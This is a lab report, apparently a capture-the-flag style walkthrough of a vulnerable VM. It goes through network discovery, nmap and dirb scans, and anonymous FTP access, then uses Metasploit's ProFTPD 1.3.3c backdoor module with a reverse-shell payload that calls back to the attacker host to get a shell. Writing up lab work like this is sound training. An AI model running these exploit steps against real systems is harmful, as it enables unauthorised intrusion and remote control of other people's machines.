# Report Labs / Flavio POGGIOLI

## Table of contents

  - [Report Labs / Flavio POGGIOLI](#report-labs--flavio-poggioli)
  - [Table of contents](#table-of-contents)

## VM n°216

Targets : webadmin, gain access, root

### 1. Find IP address of the machine

```bash
$ sudo netdiscover -r 10.0.2.0/24
```

![picture 0](../images/ec0769a49143b2456a67d76a41b1e32446ba07f4c9906ce635596a5f8a70f2bc.png)  
 
Our target is 10.0.2.6 (the others machines is Vbox address). 

### 2. List all open ports

We need to determine the open ports and the services running on them using nmap with some options (uniquly ports and secondly enabling default scripts, identifying service versions, and disregarding ping host discovery.).

```bash
$ sudo nmap -p- 10.0.2.6
$ sudo nmap -sC -sV -Pn 10.0.2.6
```
![picture 5](../images/db95c4489a4ac9a1f4c058d4f97ac2b88ceb10822b58affbf48137f00c7fcca3.png)  

![picture 4](../images/262c0ddcab3f395461a1a49017680b320460c1689009e9435c28aeed490116e0.png)  

We can see that theses ports are open (all TCP) :

- port 21 — ProFTPD 1.3.3c
- port 22 — OpenSSH 7.2p2 Ubuntu
- port 80 — Apache httpd 2.4.18

### 3. Find vulnerabilities

#### 3.1. Port 80 - HTTP

We can try to find vulnerabilities on the web server with dirb.

```bash
$ dirb http://10.0.2.6
```
We have a lot of results, some pages are interesting.

 ![picture 6](../images/d76df4ca34f1a2f0f376a60d6dfbe5fc11602e0dcf08bec9c0dc122ac98fb78c.png)  

`http://10.0.2.6` is the main page of the web server.

We can see a secret blog, without any CSS and powered by Wordpress.

Some pages redirecting on `https://vtcsec/secret/index.php`

![picture 8](../images/0ca9e91cc6a1ac59dbe1d4bfb77fa434e74d25d98e4b8d5db63f43a03b64c516.png)  

![picture 9](../images/7fff7f5f59f120535744735fb4047566f0d9ef1bde006fc8e595ee70e418191e.png)  

![picture 10](../images/756dd6ab167655bbb303953963203e5ff0be9f5ec6459223fc27166e370afda8.png)  

But nothing can be find on this service.

#### 3.2. Port 22 - SSH

I have tried to connect with ssh with common credentials but nothing happened.

![picture 7](../images/4d68c8c67e1e34f39261f06c388214c95b0111334bca87d9ac95417c1c933a02.png)  

#### 3.3. Port 21 - FTP

The main entry point for this machine is the FTP service. We can connect with anonymous user.

```bash
$ ftp 10.0.2.6
```	
![picture 11](../images/20b810972ea56768229f9c5952485dd91fc2b671d0a3e29c948521fe90caf250.png)  

### 4. Exploit

We can now try to exploit the FTP service.

```bash
$ searchsploit proftpd 1.3.3c
```
or 
```bash
$ msfconsole
> search proftpd 1.3.3c
> use 0
```

![picture 17](../images/fbdd9beb7be41c860c916fb4ec6a0f2bb48485e57df4c47ae89d3dcd6e923613.png)  
  

We can see that there is a module for this version of ProFTPD to access to a backdoor.

```bash	
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options
```

![picture 18](../images/493b8545a28d44f32394d55be5f20ff5dc4e2355ad57a418fee0d62a07900c65.png)  

We need to set the options (only required) of the exploit.
The RPORT is already set (21).

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.6
```

![picture 19](../images/b96b94681af01e4b68fb35e2f89d44203c027ad4a54942b4aad5f51c9a63c5eb.png)  

Now, the payload need to be set. We can use a reverse shell after searching with the command :

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
```
![picture 20](../images/b9c7ded38eb8b8f6503bd767d4fa467a5c5dbebe7906c4a356a6ffe6a7e7648b.png)  

We can use the payload `cmd/unix/reverse` and set the LHOST.

```bash
set payload cmd/unix/reverse
set LHOST 10.0.2.15
```
Now we can launch the exploit.

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
```

![picture 22](../images/1680addc9b504df496e4c56ecb30eb7eb0d06bfc99df9e671d1282a9bf37e94a.png)  


We now have a shell-like on the machine.
We can prove it with the command `whoami`.

Our target is reached.